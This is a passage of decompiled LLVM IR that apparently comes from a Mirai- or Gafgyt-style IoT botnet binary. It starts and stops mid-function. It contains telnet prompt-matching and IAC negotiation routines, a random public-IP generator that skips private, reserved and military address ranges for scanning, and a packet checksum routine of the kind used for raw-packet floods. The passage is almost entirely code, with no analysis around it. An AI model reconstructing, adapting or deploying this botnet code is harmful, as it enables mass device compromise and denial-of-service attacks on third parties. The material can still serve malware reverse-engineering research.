  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2d4

dec_label_pc_a254:                                ; preds = %dec_label_pc_a234
  %v2_a25c = load i8, i8* %v1_a1b8, align 1
  %v7_a260 = icmp eq i8 %v2_a25c, 3
  %v7_a274 = icmp eq i8 %v2_a25c, -3
  br i1 %v7_a260, label %dec_label_pc_a268, label %dec_label_pc_a2a0

dec_label_pc_a268:                                ; preds = %dec_label_pc_a254
  br i1 %v7_a274, label %dec_label_pc_a27c, label %dec_label_pc_a288

dec_label_pc_a27c:                                ; preds = %dec_label_pc_a268
  br label %dec_label_pc_a290

dec_label_pc_a288:                                ; preds = %dec_label_pc_a268
  br label %dec_label_pc_a290

dec_label_pc_a290:                                ; preds = %dec_label_pc_a27c, %dec_label_pc_a288
  %storemerge = phi i8 [ -3, %dec_label_pc_a288 ], [ -5, %dec_label_pc_a27c ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2d4

dec_label_pc_a2a0:                                ; preds = %dec_label_pc_a254
  br i1 %v7_a274, label %dec_label_pc_a2b4, label %dec_label_pc_a2c0

dec_label_pc_a2b4:                                ; preds = %dec_label_pc_a2a0
  br label %dec_label_pc_a2c8

dec_label_pc_a2c0:                                ; preds = %dec_label_pc_a2a0
  br label %dec_label_pc_a2c8

dec_label_pc_a2c8:                                ; preds = %dec_label_pc_a2b4, %dec_label_pc_a2c0
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a2c0 ], [ -4, %dec_label_pc_a2b4 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2d4

dec_label_pc_a2d4:                                ; preds = %dec_label_pc_a290, %dec_label_pc_a248, %dec_label_pc_a228, %dec_label_pc_a2c8
  %v5_a2e8 = call i32 @__libc_send(i32 %arg1, i32* nonnull %v5_a210, i32 1, i32 16384)
  %v1_a2f0 = add i32 %arg2, 2
  %v4_a304 = inttoptr i32 %v1_a2f0 to i32*
  %v5_a304 = call i32 @__libc_send(i32 %arg1, i32* %v4_a304, i32 1, i32 16384)
  br label %dec_label_pc_a310

dec_label_pc_a310:                                ; preds = %dec_label_pc_a1d8, %dec_label_pc_a2d4, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a310, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a2d4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a2c8, { 1, 0 }
  uselistorder label %dec_label_pc_a290, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a340 = call i32 @strlen(i8* %arg1)
  %v2_a388 = add i32 %v3_a340, %tmp
  br label %dec_label_pc_a45c

dec_label_pc_a360:                                ; preds = %dec_label_pc_a3e8, %dec_label_pc_a3c4, %dec_label_pc_a3a0, %dec_label_pc_a37c
  %v1_a364 = add nsw i32 %stack_var_-24.013, 1
  %v7_a378 = icmp sgt i32 %v3_a340, %v1_a364
  br i1 %v7_a378, label %dec_label_pc_a37c, label %dec_label_pc_a40c

dec_label_pc_a37c:                                ; preds = %dec_label_pc_a36c.preheader, %dec_label_pc_a360
  %stack_var_-24.013 = phi i32 [ %v1_a364, %dec_label_pc_a360 ], [ %stack_var_-24.1, %dec_label_pc_a36c.preheader ]
  %v2_a390 = sub i32 %v2_a388, %stack_var_-24.013
  %v1_a394 = inttoptr i32 %v2_a390 to i8*
  %v2_a394 = load i8, i8* %v1_a394, align 1
  %v2_a398 = icmp eq i8 %v2_a394, 0
  br i1 %v2_a398, label %dec_label_pc_a360, label %dec_label_pc_a3a0

dec_label_pc_a3a0:                                ; preds = %dec_label_pc_a37c
  %v2_a3b8 = load i8, i8* %v1_a394, align 1
  %v7_a3bc = icmp eq i8 %v2_a3b8, 32
  br i1 %v7_a3bc, label %dec_label_pc_a360, label %dec_label_pc_a3c4

dec_label_pc_a3c4:                                ; preds = %dec_label_pc_a3a0
  %v2_a3dc = load i8, i8* %v1_a394, align 1
  %v7_a3e0 = icmp eq i8 %v2_a3dc, 13
  br i1 %v7_a3e0, label %dec_label_pc_a360, label %dec_label_pc_a3e8

dec_label_pc_a3e8:                                ; preds = %dec_label_pc_a3c4
  %v2_a400 = load i8, i8* %v1_a394, align 1
  %v7_a404 = icmp eq i8 %v2_a400, 10
  br i1 %v7_a404, label %dec_label_pc_a360, label %dec_label_pc_a40c

dec_label_pc_a40c:                                ; preds = %dec_label_pc_a3e8, %dec_label_pc_a360, %dec_label_pc_a36c.preheader
  %stack_var_-24.0.lcssa = phi i32 [ %stack_var_-24.1, %dec_label_pc_a36c.preheader ], [ %stack_var_-24.013, %dec_label_pc_a3e8 ], [ %v1_a364, %dec_label_pc_a360 ]
  %v2_a420 = sub i32 %v2_a388, %stack_var_-24.0.lcssa
  %v1_a424 = inttoptr i32 %v2_a420 to i8*
  %v2_a424 = load i8, i8* %v1_a424, align 1
  %v2_a434 = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_1946c.70 to i32)
  %v1_a438 = inttoptr i32 %v2_a434 to i8*
  %v2_a438 = load i8, i8* %v1_a438, align 1
  %v9_a43c = icmp eq i8 %v2_a424, %v2_a438
  %v1_a454 = add i32 %storemerge2, 1
  br i1 %v9_a43c, label %dec_label_pc_a47c, label %dec_label_pc_a45c

dec_label_pc_a45c:                                ; preds = %dec_label_pc_a40c, %entry
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0.lcssa, %dec_label_pc_a40c ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_a454, %dec_label_pc_a40c ]
  %v3_a464 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1946c.70, i32 0, i32 0))
  %v3_a46c = icmp ult i32 %storemerge2, %v3_a464
  br i1 %v3_a46c, label %dec_label_pc_a36c.preheader, label %dec_label_pc_a47c

dec_label_pc_a36c.preheader:                      ; preds = %dec_label_pc_a45c
  %v7_a37812 = icmp sgt i32 %v3_a340, %stack_var_-24.1
  br i1 %v7_a37812, label %dec_label_pc_a37c, label %dec_label_pc_a40c

dec_label_pc_a47c:                                ; preds = %dec_label_pc_a45c, %dec_label_pc_a40c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_a40c ], [ 0, %dec_label_pc_a45c ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a340, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a40c, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a494 = load i32, i32* @fp, align 4
  store i32 %v3_a494, i32* %stack_var_-16, align 4
  %v13_a494 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a4e4 = ptrtoint i32* %stack_var_-168 to i32
  %v3_a524 = udiv i32 %arg1, 32
  %v3_a530 = mul nuw nsw i32 %v3_a524, 4
  %v1_a548 = urem i32 %arg1, 32
  %v6_a550 = shl i32 1, %v1_a548
  %v1_a574 = add i32 %arg1, 1
  %v2_a57c = ptrtoint i32* %stack_var_-176 to i32
  %v6_a69c = inttoptr i32 %arg2 to i8*
  %v2_a6b0 = icmp eq i32 %arg3, 0
  %v1_a6bc = inttoptr i32 %arg6 to i8*
  %v5_a700 = icmp sgt i32 %arg5, 0
  %v2_a538 = add nsw i32 %v3_a530, -152
  %v2_a53c = add i32 %v2_a538, %v13_a494
  %v1_a540 = inttoptr i32 %v2_a53c to i32*
  br label %dec_label_pc_a6d8

dec_label_pc_a4f8.lr.ph:                          ; preds = %dec_label_pc_a6ec, %dec_label_pc_a6f8
  br label %dec_label_pc_a4f8

dec_label_pc_a4f8:                                ; preds = %dec_label_pc_a4f8.lr.ph, %dec_label_pc_a4f8
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a4f8.lr.ph ], [ %v1_a50c, %dec_label_pc_a4f8 ]
  %v5_a504 = mul nuw nsw i32 %storemerge27, 4
  %v6_a504 = add i32 %v5_a504, %v2_a4e4
  %v7_a504 = inttoptr i32 %v6_a504 to i32*
  store i32 0, i32* %v7_a504, align 4
  %v1_a50c = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a50c, 32
  br i1 %tmp30, label %dec_label_pc_a4f8, label %dec_label_pc_a520

dec_label_pc_a520:                                ; preds = %dec_label_pc_a4f8
  %v2_a540 = load i32, i32* %v1_a540, align 4
  %v2_a554 = or i32 %v2_a540, %v6_a550
  store i32 %v2_a554, i32* %v1_a540, align 4
  %v5_a590 = call i32 @__libc_select(i32 %v1_a574, i32 %v2_a4e4, i32 0, i32 0, i32 %v2_a57c)
  %tmp31 = icmp slt i32 %v5_a590, 1
  br i1 %tmp31, label %dec_label_pc_a71c, label %dec_label_pc_a5a0

dec_label_pc_a5a0:                                ; preds = %dec_label_pc_a520
  %v2_a5ac = add i32 %stack_var_-40.0, %arg6
  %v5_a5b0 = inttoptr i32 %v2_a5ac to i8*
  %v6_a5c4 = inttoptr i32 %v2_a5ac to i32*
  %v7_a5c4 = call i32 @__libc_recv(i32 %arg1, i32* %v6_a5c4, i32 1, i32 0, i32 %v2_a5ac)
  %v7_a5d4 = icmp eq i32 %v7_a5c4, -1
  br i1 %v7_a5d4, label %dec_label_pc_a5e8, label %dec_label_pc_a5dc

dec_label_pc_a5dc:                                ; preds = %dec_label_pc_a5a0
  %v2_a5e0 = icmp eq i32 %v7_a5c4, 0
  br i1 %v2_a5e0, label %dec_label_pc_a5e8, label %dec_label_pc_a5f4

dec_label_pc_a5e8:                                ; preds = %dec_label_pc_a5dc, %dec_label_pc_a5a0
  br label %dec_label_pc_a724

dec_label_pc_a5f4:                                ; preds = %dec_label_pc_a5dc
  %v2_a5fc = add i32 %v7_a5c4, %stack_var_-40.0
  %v2_a608 = load i8, i8* %v5_a5b0, align 1
  %v2_a60c = icmp eq i8 %v2_a608, -1
  br i1 %v2_a60c, label %dec_label_pc_a614, label %dec_label_pc_a694

dec_label_pc_a614:                                ; preds = %dec_label_pc_a5f4
  %v1_a618 = add i32 %v2_a5ac, 1
  %v5_a62c = inttoptr i32 %v1_a618 to i32*
  %v6_a62c = call i32 @__libc_recv(i32 %arg1, i32* %v5_a62c, i32 2, i32 0, i32 %v2_a5fc)
  %v7_a63c = icmp eq i32 %v6_a62c, -1
  br i1 %v7_a63c, label %dec_label_pc_a650, label %dec_label_pc_a644

dec_label_pc_a644:                                ; preds = %dec_label_pc_a614
  %v2_a648 = icmp eq i32 %v6_a62c, 0
  br i1 %v2_a648, label %dec_label_pc_a650, label %dec_label_pc_a65c

dec_label_pc_a650:                                ; preds = %dec_label_pc_a644, %dec_label_pc_a614
  br label %dec_label_pc_a724

dec_label_pc_a65c:                                ; preds = %dec_label_pc_a644
  %v2_a664 = add i32 %v6_a62c, %v2_a5fc
  %v5_a678 = call i32 @negotiate(i32 %arg1, i32 %v2_a5ac, i32 3, i32 %v2_a664, i32 %v2_a664)
  %v2_a680 = icmp eq i32 %v5_a678, 0
  br i1 %v2_a680, label %dec_label_pc_a688, label %dec_label_pc_a6d8

dec_label_pc_a688:                                ; preds = %dec_label_pc_a65c
  br label %dec_label_pc_a724

dec_label_pc_a694:                                ; preds = %dec_label_pc_a5f4
  %v3_a608 = zext i8 %v2_a608 to i32
  %v7_a69c = call i32 @strstr(i32 %arg6, i8* %v6_a69c, i32 %stack_var_-40.0, i32 %v3_a608, i32 %v2_a5fc, i32 %v7_a5c4)
  %v2_a6a4 = icmp eq i32 %v7_a69c, 0
  br i1 %v2_a6a4, label %dec_label_pc_a6ac, label %dec_label_pc_a710

dec_label_pc_a6ac:                                ; preds = %dec_label_pc_a694
  br i1 %v2_a6b0, label %dec_label_pc_a6d8, label %dec_label_pc_a6b8

dec_label_pc_a6b8:                                ; preds = %dec_label_pc_a6ac
  %v2_a6bc = call i32 @matchPrompt(i8* %v1_a6bc)
  %v2_a6c4 = icmp eq i32 %v2_a6bc, 0
  br i1 %v2_a6c4, label %dec_label_pc_a6d8, label %dec_label_pc_a710

dec_label_pc_a6d8:                                ; preds = %dec_label_pc_a65c, %dec_label_pc_a6b8, %dec_label_pc_a6ac, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_a664, %dec_label_pc_a65c ], [ %v2_a5fc, %dec_label_pc_a6ac ], [ %v2_a5fc, %dec_label_pc_a6b8 ]
  %v1_a6dc = add i32 %stack_var_-40.0, 2
  %v6_a6e8 = icmp slt i32 %v1_a6dc, %arg7
  br i1 %v6_a6e8, label %dec_label_pc_a6ec, label %dec_label_pc_a71c

dec_label_pc_a6ec:                                ; preds = %dec_label_pc_a6d8
  %v3_a6ec = load i32, i32* %stack_var_-176, align 4
  %v5_a6f4 = icmp sgt i32 %v3_a6ec, 0
  br i1 %v5_a6f4, label %dec_label_pc_a4f8.lr.ph, label %dec_label_pc_a6f8

dec_label_pc_a6f8:                                ; preds = %dec_label_pc_a6ec
  br i1 %v5_a700, label %dec_label_pc_a4f8.lr.ph, label %dec_label_pc_a71c

dec_label_pc_a710:                                ; preds = %dec_label_pc_a694, %dec_label_pc_a6b8
  br label %dec_label_pc_a724

dec_label_pc_a71c:                                ; preds = %dec_label_pc_a520, %dec_label_pc_a6f8, %dec_label_pc_a6d8
  br label %dec_label_pc_a724

dec_label_pc_a724:                                ; preds = %dec_label_pc_a710, %dec_label_pc_a688, %dec_label_pc_a650, %dec_label_pc_a5e8, %dec_label_pc_a71c
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_a71c ], [ 1, %dec_label_pc_a710 ], [ 0, %dec_label_pc_a5e8 ], [ 0, %dec_label_pc_a650 ], [ 0, %dec_label_pc_a688 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 3, 1, 0, 2 }
  uselistorder i32 %v6_a62c, { 1, 2, 0 }
  uselistorder i8 %v2_a608, { 1, 0 }
  uselistorder i32 %v2_a5fc, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v7_a5c4, { 2, 1, 3, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a4e4, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_a724, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a71c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a710, { 1, 0 }
  uselistorder label %dec_label_pc_a6d8, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a4f8, { 1, 0 }
  uselistorder label %dec_label_pc_a4f8.lr.ph, { 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_a738 = load i32, i32* @r4, align 4
  %v6_a738 = load i32, i32* @fp, align 4
  store i32 42816, i32* %stack_var_-4, align 4
  %v2_a73c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a73c, i32* @fp, align 4
  %v0_a744 = call i32 @random()
  %v2_a754 = srem i32 %v0_a744, 223
  %v1_a764 = trunc i32 %v2_a754 to i8
  store i8 %v1_a764, i8* bitcast (i8** @global_var_23547.72 to i8*), align 4
  %v0_a768 = call i32 @random()
  %v2_a778 = srem i32 %v0_a768, 255
  %v1_a788 = trunc i32 %v2_a778 to i8
  store i8 %v1_a788, i8* @global_var_23548.73, align 1
  %v0_a78c = call i32 @random()
  %v2_a79c = srem i32 %v0_a78c, 255
  %v1_a7ac = trunc i32 %v2_a79c to i8
  store i8 %v1_a7ac, i8* @global_var_23549.74, align 1
  %v0_a7b0 = call i32 @random()
  br label %dec_label_pc_a868

dec_label_pc_a7d8:                                ; preds = %dec_label_pc_aa78, %dec_label_pc_aa68, %dec_label_pc_aa58, %dec_label_pc_aa48, %dec_label_pc_aa38, %dec_label_pc_aa28, %dec_label_pc_aa18, %dec_label_pc_aa08, %dec_label_pc_a9f8, %dec_label_pc_a9e8, %dec_label_pc_a9d8, %dec_label_pc_a9c8, %dec_label_pc_a9b8, %dec_label_pc_a9a8, %dec_label_pc_a998, %dec_label_pc_a968, %dec_label_pc_a948, %dec_label_pc_a918, %dec_label_pc_a8e8, %dec_label_pc_a8c8, %dec_label_pc_a8b8, %dec_label_pc_a8a8, %dec_label_pc_a898, %dec_label_pc_a888, %dec_label_pc_a878, %dec_label_pc_a868
  %v0_a7d8 = call i32 @random()
  %v2_a7e8 = srem i32 %v0_a7d8, 223
  %v1_a7f8 = trunc i32 %v2_a7e8 to i8
  store i8 %v1_a7f8, i8* bitcast (i8** @global_var_23547.72 to i8*), align 4
  %v0_a7fc = call i32 @random()
  %v2_a80c = srem i32 %v0_a7fc, 255
  %v1_a81c = trunc i32 %v2_a80c to i8
  store i8 %v1_a81c, i8* @global_var_23548.73, align 1
  %v0_a820 = call i32 @random()
  %v2_a830 = srem i32 %v0_a820, 255
  %v1_a840 = trunc i32 %v2_a830 to i8
  store i8 %v1_a840, i8* @global_var_23549.74, align 1
  %v0_a844 = call i32 @random()
  br label %dec_label_pc_a868

dec_label_pc_a868:                                ; preds = %entry, %dec_label_pc_a7d8
  %storemerge7 = phi i32 [ %v0_a7b0, %entry ], [ %v0_a844, %dec_label_pc_a7d8 ]
  %v2_a7c0 = srem i32 %storemerge7, 255
  %extract.t4 = trunc i32 %v2_a7c0 to i8
  store i8 %extract.t4, i8* @global_var_2354a.75, align 1
  %v2_a86c = load i8, i8* bitcast (i8** @global_var_23547.72 to i8*), align 4
  %v3_a86c = zext i8 %v2_a86c to i32
  %v7_a870 = icmp eq i8 %v2_a86c, 127
  br i1 %v7_a870, label %dec_label_pc_a7d8, label %dec_label_pc_a878

dec_label_pc_a878:                                ; preds = %dec_label_pc_a868
  %v2_a880 = icmp eq i8 %v2_a86c, 0
  br i1 %v2_a880, label %dec_label_pc_a7d8, label %dec_label_pc_a888

dec_label_pc_a888:                                ; preds = %dec_label_pc_a878
  %v7_a890 = icmp eq i8 %v2_a86c, 3
  br i1 %v7_a890, label %dec_label_pc_a7d8, label %dec_label_pc_a898

dec_label_pc_a898:                                ; preds = %dec_label_pc_a888
  %v7_a8a0 = icmp eq i8 %v2_a86c, 15
  br i1 %v7_a8a0, label %dec_label_pc_a7d8, label %dec_label_pc_a8a8

dec_label_pc_a8a8:                                ; preds = %dec_label_pc_a898
  %v7_a8b0 = icmp eq i8 %v2_a86c, 16
  br i1 %v7_a8b0, label %dec_label_pc_a7d8, label %dec_label_pc_a8b8

dec_label_pc_a8b8:                                ; preds = %dec_label_pc_a8a8
  %v7_a8c0 = icmp eq i8 %v2_a86c, 56
  br i1 %v7_a8c0, label %dec_label_pc_a7d8, label %dec_label_pc_a8c8

dec_label_pc_a8c8:                                ; preds = %dec_label_pc_a8b8
  %v7_a8d0 = icmp eq i8 %v2_a86c, 10
  br i1 %v7_a8d0, label %dec_label_pc_a7d8, label %dec_label_pc_a8d8

dec_label_pc_a8d8:                                ; preds = %dec_label_pc_a8c8
  %v7_a8e0 = icmp eq i8 %v2_a86c, -64
  br i1 %v7_a8e0, label %dec_label_pc_a8e8, label %dec_label_pc_a8f8

dec_label_pc_a8e8:                                ; preds = %dec_label_pc_a8d8
  %v3_a8ec = load i8, i8* @global_var_23548.73, align 1
  %v7_a8f0 = icmp eq i8 %v3_a8ec, -88
  br i1 %v7_a8f0, label %dec_label_pc_a7d8, label %dec_label_pc_a8f8

dec_label_pc_a8f8:                                ; preds = %dec_label_pc_a8d8, %dec_label_pc_a8e8
  %v7_a900 = icmp eq i8 %v2_a86c, -84
  br i1 %v7_a900, label %dec_label_pc_a908, label %dec_label_pc_a928

dec_label_pc_a908:                                ; preds = %dec_label_pc_a8f8
  %v3_a90c = load i8, i8* @global_var_23548.73, align 1
  %tmp = icmp ult i8 %v3_a90c, 16
  br i1 %tmp, label %dec_label_pc_a928, label %dec_label_pc_a918

dec_label_pc_a918:                                ; preds = %dec_label_pc_a908
  %tmp19 = icmp ult i8 %v3_a90c, 32
  br i1 %tmp19, label %dec_label_pc_a7d8, label %dec_label_pc_a928

dec_label_pc_a928:                                ; preds = %dec_label_pc_a8f8, %dec_label_pc_a918, %dec_label_pc_a908
  %v7_a930 = icmp eq i8 %v2_a86c, 100
  br i1 %v7_a930, label %dec_label_pc_a938, label %dec_label_pc_a958

dec_label_pc_a938:                                ; preds = %dec_label_pc_a928
  %v3_a93c = load i8, i8* @global_var_23548.73, align 1
  %tmp20 = icmp ult i8 %v3_a93c, 64
  br i1 %tmp20, label %dec_label_pc_a958, label %dec_label_pc_a948

dec_label_pc_a948:                                ; preds = %dec_label_pc_a938
  %tmp21 = icmp ult i8 %v3_a93c, 127
  br i1 %tmp21, label %dec_label_pc_a7d8, label %dec_label_pc_a958

dec_label_pc_a958:                                ; preds = %dec_label_pc_a928, %dec_label_pc_a948, %dec_label_pc_a938
  %v7_a960 = icmp eq i8 %v2_a86c, -87
  br i1 %v7_a960, label %dec_label_pc_a968, label %dec_label_pc_a978

dec_label_pc_a968:                                ; preds = %dec_label_pc_a958
  %v3_a96c = load i8, i8* @global_var_23548.73, align 1
  %v2_a970 = icmp eq i8 %v3_a96c, -1
  br i1 %v2_a970, label %dec_label_pc_a7d8, label %dec_label_pc_a978

dec_label_pc_a978:                                ; preds = %dec_label_pc_a958, %dec_label_pc_a968
  %v7_a980 = icmp eq i8 %v2_a86c, -58
  br i1 %v7_a980, label %dec_label_pc_a988, label %dec_label_pc_a9a8

dec_label_pc_a988:                                ; preds = %dec_label_pc_a978
  %v3_a98c = load i8, i8* @global_var_23548.73, align 1
  %tmp22 = icmp ult i8 %v3_a98c, 18
  br i1 %tmp22, label %dec_label_pc_a9a8, label %dec_label_pc_a998

dec_label_pc_a998:                                ; preds = %dec_label_pc_a988
  %tmp23 = or i8 %v3_a98c, 1
  %tmp24 = icmp eq i8 %tmp23, 19
  br i1 %tmp24, label %dec_label_pc_a7d8, label %dec_label_pc_a9a8

dec_label_pc_a9a8:                                ; preds = %dec_label_pc_a978, %dec_label_pc_a998, %dec_label_pc_a988
  %v7_a9b0 = icmp eq i8 %v2_a86c, -32
  br i1 %v7_a9b0, label %dec_label_pc_a7d8, label %dec_label_pc_a9b8

dec_label_pc_a9b8:                                ; preds = %dec_label_pc_a9a8
  %v7_a9c0 = icmp eq i8 %v2_a86c, 6
  br i1 %v7_a9c0, label %dec_label_pc_a7d8, label %dec_label_pc_a9c8

dec_label_pc_a9c8:                                ; preds = %dec_label_pc_a9b8
  %v7_a9d0 = icmp eq i8 %v2_a86c, 7
  br i1 %v7_a9d0, label %dec_label_pc_a7d8, label %dec_label_pc_a9d8

dec_label_pc_a9d8:                                ; preds = %dec_label_pc_a9c8
  %v7_a9e0 = icmp eq i8 %v2_a86c, 11
  br i1 %v7_a9e0, label %dec_label_pc_a7d8, label %dec_label_pc_a9e8

dec_label_pc_a9e8:                                ; preds = %dec_label_pc_a9d8
  %v7_a9f0 = icmp eq i8 %v2_a86c, 21
  br i1 %v7_a9f0, label %dec_label_pc_a7d8, label %dec_label_pc_a9f8

dec_label_pc_a9f8:                                ; preds = %dec_label_pc_a9e8
  %v7_aa00 = icmp eq i8 %v2_a86c, 22
  br i1 %v7_aa00, label %dec_label_pc_a7d8, label %dec_label_pc_aa08

dec_label_pc_aa08:                                ; preds = %dec_label_pc_a9f8
  %v7_aa10 = icmp eq i8 %v2_a86c, 26
  br i1 %v7_aa10, label %dec_label_pc_a7d8, label %dec_label_pc_aa18

dec_label_pc_aa18:                                ; preds = %dec_label_pc_aa08
  %v7_aa20 = icmp eq i8 %v2_a86c, 28
  br i1 %v7_aa20, label %dec_label_pc_a7d8, label %dec_label_pc_aa28

dec_label_pc_aa28:                                ; preds = %dec_label_pc_aa18
  %v7_aa30 = icmp eq i8 %v2_a86c, 29
  br i1 %v7_aa30, label %dec_label_pc_a7d8, label %dec_label_pc_aa38

dec_label_pc_aa38:                                ; preds = %dec_label_pc_aa28
  %v7_aa40 = icmp eq i8 %v2_a86c, 30
  br i1 %v7_aa40, label %dec_label_pc_a7d8, label %dec_label_pc_aa48

dec_label_pc_aa48:                                ; preds = %dec_label_pc_aa38
  %v7_aa50 = icmp eq i8 %v2_a86c, 33
  br i1 %v7_aa50, label %dec_label_pc_a7d8, label %dec_label_pc_aa58

dec_label_pc_aa58:                                ; preds = %dec_label_pc_aa48
  %v7_aa60 = icmp eq i8 %v2_a86c, 55
  br i1 %v7_aa60, label %dec_label_pc_a7d8, label %dec_label_pc_aa68

dec_label_pc_aa68:                                ; preds = %dec_label_pc_aa58
  %v7_aa70 = icmp eq i8 %v2_a86c, -42
  br i1 %v7_aa70, label %dec_label_pc_a7d8, label %dec_label_pc_aa78

dec_label_pc_aa78:                                ; preds = %dec_label_pc_aa68
  %v7_aa80 = icmp eq i8 %v2_a86c, -41
  br i1 %v7_aa80, label %dec_label_pc_a7d8, label %dec_label_pc_aa88

dec_label_pc_aa88:                                ; preds = %dec_label_pc_aa78
  %v2_aa88 = ptrtoint i32* %stack_var_-36 to i32
  store i32 0, i32* %stack_var_-36, align 4
  %v3_aad0 = load i8, i8* @global_var_23548.73, align 1
  %v4_aad0 = zext i8 %v3_aad0 to i32
  store i32 %v4_aad0, i32* @r4, align 4
  %v3_aadc = load i8, i8* @global_var_23549.74, align 1
  %v6_ab04 = sext i8 %v3_aad0 to i32
  %v8_ab04 = sext i8 %v3_aadc to i32
  %v10_ab04 = sext i8 %extract.t4 to i32
  %v15_ab04 = call i32 @szprintf(i32 %v2_aa88, i32 ptrtoint ([12 x i8]* @global_var_19474.77 to i32), i32 %v3_a86c, i32 %v6_ab04, i32 %v8_ab04, i32 %v10_ab04, i32 0, i32 0, i32 0, i32 0)
  store i32 %v2_aa88, i32* @r0, align 4
  %v1_ab10 = call i32 @inet_addr(i32 %v2_aa88)
  store i32 %v3_a738, i32* @r4, align 4
  store i32 %v6_a738, i32* @fp, align 4
  ret i32 %v1_ab10

; uselistorder directives
  uselistorder i32 %v2_aa88, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* @global_var_23549.74, { 2, 1, 0 }
  uselistorder i8* @global_var_23548.73, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_23547.72 to i8*), { 2, 0, 1 }
  uselistorder label %dec_label_pc_a9a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a978, { 1, 0 }
  uselistorder label %dec_label_pc_a958, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a928, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a8f8, { 1, 0 }
  uselistorder label %dec_label_pc_a868, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_ab30 = load i32, i32* @fp, align 4
  %v2_ab44 = load i32, i32* @global_var_297ac.79, align 4
  %v1_ab4c = call i32 @ntohl(i32 %v2_ab44)
  %v2_ab58 = and i32 %v1_ab4c, %arg1
  %v0_ab60 = call i32 @rand_cmwc()
  %v1_ab6c = sub i32 -1, %arg1
  %v2_ab70 = and i32 %v0_ab60, %v1_ab6c
  %v2_ab78 = xor i32 %v2_ab70, %v2_ab58
  store i32 %v3_ab30, i32* @fp, align 4
  ret i32 %v2_ab78

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @csum(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_ac089 = icmp sgt i32 %arg2, 1
  br i1 %v8_ac089, label %dec_label_pc_abb8, label %dec_label_pc_ac0c

dec_label_pc_abb8:                                ; preds = %entry, %dec_label_pc_abb8
  %v2_abd4 = phi i32 [ %v2_abd8, %dec_label_pc_abb8 ], [ 0, %entry ]
  %stack_var_-40.012 = phi i32 [ %v5_abdc, %dec_label_pc_abb8 ], [ 0, %entry ]
  %stack_var_-36.011 = phi i32 [ %v1_abf8, %dec_label_pc_abb8 ], [ %arg2, %entry ]
  %stack_var_-32.010 = phi i8* [ %v5_abf0, %dec_label_pc_abb8 ], [ %arg1, %entry ]
  %v4_abb8 = ptrtoint i8* %stack_var_-32.010 to i32
  %v2_abbc = load i8, i8* %stack_var_-32.010, align 1
  %v3_abbc = zext i8 %v2_abbc to i32
  %v1_abc0 = add i32 %v4_abb8, 1
  %v2_abc0 = inttoptr i32 %v1_abc0 to i8*
  %v3_abc0 = load i8, i8* %v2_abc0, align 1
  %v4_abc0 = zext i8 %v3_abc0 to i32
  %v4_abc4 = mul nuw nsw i32 %v4_abc0, 256
  %v5_abc4 = or i32 %v4_abc4, %v3_abbc
  %v2_abd8 = add i32 %v5_abc4, %v2_abd4
  %v3_abd8 = icmp ult i32 %v2_abd8, %v2_abd4
  %v4_abdc = zext i1 %v3_abd8 to i32
  %v5_abdc = add i32 %v4_abdc, %stack_var_-40.012
  %v1_abec = add i32 %v4_abb8, 2
